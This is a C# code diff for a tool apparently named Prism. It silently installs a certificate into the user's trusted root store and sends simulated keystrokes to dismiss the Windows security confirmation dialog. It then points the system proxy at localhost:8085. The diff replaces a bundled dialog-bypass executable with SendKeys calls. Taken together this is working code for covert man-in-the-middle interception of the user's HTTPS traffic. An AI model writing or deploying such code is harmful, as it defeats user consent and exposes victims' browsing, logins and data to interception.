@@ -10,6 +10,7 @@ using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace Prism
 {
@@ -27,10 +28,8 @@ namespace Prism
             {
                 //Define file paths
                 string cert = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\prism.der";
-                string bypassdlg = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\bypassdlg.exe";
                 //Extract files
                 File.WriteAllBytes(cert, Properties.Resources.cert);
-                File.WriteAllBytes(bypassdlg, Properties.Resources.bypassdlg);
                 //Install certificate
                 X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser); //Store the certificate in current user's root authority
                 X509Certificate2 certificate = new X509Certificate2(cert); //Convert the certificate to a specific format so it will be easier to process
@@ -39,10 +38,10 @@ namespace Prism
                 { //Create a new thread in order to bypass the confirmation dialog
                     try
                     {
-                        p.StartInfo.FileName = bypassdlg;
-                        p.StartInfo.Arguments = "dlg \" \" \" \" click yes";
-                        Thread.Sleep(2000); //Wait for the prompt to appear
-                        p.Start(); //Bypass the prompt
+                        Thread.Sleep(2000); //Wait for the dialog to appear
+                        //Send left arrow & enter keyboard commands to bypass the dialog
+                        SendKeys.SendWait("{LEFT}");
+                        SendKeys.SendWait("{ENTER}");
                     }
                     catch
                     {
@@ -51,9 +50,7 @@ namespace Prism
                 }).Start();
                 store.Add(certificate); //Add the certificate to the opened store (this is where the dialog prompts the user)
                 store.Close(); //Close the opened certificate store
-                p.WaitForExit(); //Wait for the bypass to exit before trying deleting it.
                 File.Delete(cert); //Delete the certificate
-                File.Delete(bypassdlg); //Delete the bypass executable
                 RegistryKey reg_key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true); //Change this line if you want to install the Certificate for all users (it requires UAC Prompt)
                 reg_key.SetValue("ProxyServer", "localhost:8085"); //Set the system proxy settings
                 reg_key.SetValue("ProxyEnable", 1);  //Enable the proxy
